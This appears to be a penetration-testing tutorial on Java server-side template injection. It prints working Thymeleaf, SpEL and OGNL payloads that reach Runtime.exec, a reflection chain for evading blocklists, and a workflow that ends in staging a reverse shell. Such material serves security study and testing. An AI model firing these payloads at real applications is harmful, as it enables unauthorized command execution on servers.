---
title: "Java JSP, Thymeleaf, and SpEL SSTI: expression preprocessing to Runtime.exec"
description: Exploiting server-side template injection in Java view layers, Thymeleaf expression preprocessing, SpEL and OGNL reflection via T(), and JSP EL sinks that reach java.lang.Runtime for command execution.
keywords:
  - SSTI
  - Thymeleaf
  - JSP
  - SpEL
  - OGNL
  - Java template injection
---

# JSP, Thymeleaf, and similar

Java web applications render views through several expression-driven layers, **Thymeleaf** `th:*` attributes, **JSP** Expression Language (EL), **Spring Expression Language (SpEL)**, **OGNL**, **Freemarker**, and **Velocity**. Each is a small language that resolves properties and invokes methods on a backing object model. Server-side template injection appears when user input is composed into the *expression or fragment source* these layers parse, rather than bound as a value. Because the object model is the Java runtime, a successful climb reaches `java.lang.Runtime` and command execution.

## Overview

Thymeleaf's most dangerous sink is the **fragment expression** built from request data. When a controller returns a view name or fragment that concatenates user input, Thymeleaf's expression preprocessing (`__...__`) evaluates it:

```java
// fragment name derived from a request parameter
return "welcome :: " + section;   // section is user-controlled
```

A value such as `__${T(java.lang.Runtime).getRuntime().exec("id")}__::x` causes Thymeleaf to **preprocess** the inner `${...}` as a SpEL expression before rendering, running `exec` on the server. The developer intended `section` to select a fragment; the engine parsed it as code.

The same class of bug surrounds **JSP EL** in tag files and dynamic includes that bypass MVC separation, and any controller that hands user input to a `SpelExpressionParser` or OGNL evaluator in the request lifecycle. These SpEL/OGNL sinks overlap heavily with [expression evaluation](../expression-evaluation/index.md); the SSTI framing applies when the expression rides inside a template or view fragment.

## Thymeleaf: expression preprocessing to RCE

The canonical Thymeleaf payload abuses SpEL's `T()` type reference, which resolves an arbitrary class so its static methods can be called:

```
__${T(java.lang.Runtime).getRuntime().exec("id")}__::x
__${T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"})}__::x
```

The `__...__` wrapper is Thymeleaf **preprocessing**: the engine evaluates the inner expression first, then uses the result as part of the fragment it resolves. The `::x` tail keeps the surrounding fragment syntax valid. To capture output rather than fire-and-forget, wrap the process in a reader:

```
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::x
```

Where preprocessing is unavailable, an inline expression (`[[${...}]]`) or `th:utext`/`th:attr` sink composed from user input reaches the same SpEL evaluator.

## SpEL and OGNL: the reflection climb

When the sink is a raw SpEL or OGNL evaluator, the `T()` type reference is the shortest path, but filters often block `Runtime`. Alternatives reach execution through reflection or helper classes:

```
T(java.lang.Runtime).getRuntime().exec("id")
T(org.springframework.util.StreamUtils).copy(... )            # IO helpers
new ProcessBuilder(new String[]{"/bin/sh","-c","id"}).start() # when 'new' is allowed
```

OGNL (historically reachable through Struts and some tag libraries) offers a parallel grammar:

```
(#rt=@java.lang.Runtime@getRuntime()).exec("id")
@java.lang.Runtime@getRuntime().exec("id")
```

Reflection provides a filter-evasion route when class names are blocklisted, resolve `Class.forName` dynamically and invoke methods by reflection so the literal `Runtime` never appears:

```
T(java.lang.Class).forName("java.lang.Runtime").getMethod("exec",T(java.lang.String)) ...
```

## JSP EL and includes

Classic JSP surfaces are narrower but still live in legacy code:

- **EL in tag files** that interpolates request attributes composed from user input.
- **Dynamic `<jsp:include>` / `<c:import>`** whose page/url is attacker-shaped, enabling local or remote fragment inclusion that pulls in an attacker-controlled template.
- **Scriptlet-adjacent patterns** where a value flows into an expression evaluated at render time.

These are high-impact when present because JSP runs with the full servlet container's privileges, but modern frameworks have largely displaced raw scriptlets, so the realistic Java SSTI today is Thymeleaf/SpEL.

## Exploitation workflow

1. **Confirm evaluation.** Probe `${7*7}`, `#{7*7}`, `*{7*7}`; a computed result marks a live sink.
2. **Fingerprint.** Separate Thymeleaf vs Freemarker vs Velocity vs raw SpEL/OGNL via preprocessing markers, directive syntax, and error strings.
3. **Reach a type.** Use `T(...)` (SpEL) or `@class@method` (OGNL) to resolve `java.lang.Runtime` or `ProcessBuilder`.
4. **Capture output.** Wrap the process stream in a `Scanner`/reader so command results return in the response, or go blind/OOB when they do not.
5. **Stabilize.** Stage a reverse shell through `exec`/`ProcessBuilder` rather than pushing large payloads through the view parameter.

## Tools

- **[tplmap](https://github.com/epinna/tplmap)**, detects and exploits SSTI across Freemarker, Velocity, and related Java engines (use only where authorized).
- **[Burp Suite](https://portswigger.net/burp)** (Repeater, Intruder) for arithmetic probes, preprocessing markers, and `T()`/`@...@` payload fuzzing.
- **A local Spring/Thymeleaf test harness** pinned to the target's library versions to validate `T()`, preprocessing, and reflection chains before firing at the application.

## References

- [PortSwigger Web Security Academy: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [Spring Framework: Spring Expression Language (SpEL) reference](https://docs.spring.io/spring-framework/reference/core/expressions.html)
- [CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine](https://cwe.mitre.org/data/definitions/1336.html)
- [PayloadsAllTheThings: Server Side Template Injection, Java](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
